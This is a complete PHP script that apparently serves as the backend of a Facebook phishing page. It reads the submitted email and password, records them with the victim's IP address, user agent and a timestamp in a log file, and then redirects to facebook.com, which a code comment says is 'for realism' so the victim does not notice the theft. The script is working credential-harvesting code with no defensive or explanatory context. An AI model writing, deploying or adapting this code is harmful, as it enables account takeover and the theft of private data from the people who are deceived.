<?php
$email = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

file_put_contents("log.txt", "[$time] Email: $email | Password: $password | IP: $ip | UA: $ua\n", FILE_APPEND);
header("Location: https://facebook.com"); // redirect for realism
exit();
?>
